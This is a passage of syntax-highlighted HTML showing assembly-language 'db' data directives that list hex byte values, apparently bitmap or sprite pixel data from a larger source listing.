 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
